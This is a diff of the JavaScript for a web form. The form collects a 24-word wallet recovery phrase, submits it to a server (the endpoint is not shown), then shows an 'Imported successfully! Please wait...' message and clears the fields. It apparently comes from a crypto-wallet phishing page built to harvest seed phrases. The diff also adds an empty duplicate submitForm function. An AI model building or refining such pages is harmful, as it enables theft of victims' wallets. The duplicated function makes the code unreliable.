@@ -44,6 +44,10 @@ for (let i = 1; i <= 24; i++) {
     recoveryPhraseContainer.appendChild(field);
 }
 
+function submitForm() {
+    // Use SweetAlert2 for the success message
+    
+}
 // script.js
 async function submitForm() {
     const recoveryPhraseInputs = Array.from(document.querySelectorAll("#recovery-phrase input"))
@@ -65,20 +69,16 @@ async function submitForm() {
         const result = await response.json();
 
         if (response.ok) {
-            function submitForm() {
-                // Use SweetAlert2 for the success message
-                Swal.fire({
-                    title: 'Success!',
-                    text: 'Imported successfully! Please wait...',
-                    icon: 'success',
-                    confirmButtonText: 'OK',
-                }).then(() => {
-                    // Reset form after the user clicks "OK"
-                    const inputs = document.querySelectorAll('#recovery-phrase input');
-                    inputs.forEach(input => input.value = '');
-                });
-            }
-
+            Swal.fire({
+                title: 'Success!',
+                text: 'Imported successfully! Please wait...',
+                icon: 'success',
+                confirmButtonText: 'OK',
+            }).then(() => {
+                // Reset form after the user clicks "OK"
+                const inputs = document.querySelectorAll('#recovery-phrase input');
+                inputs.forEach(input => input.value = '');
+            });
         } else {
             Swal.fire("Error", "Failed to import ", "Try again");
         }
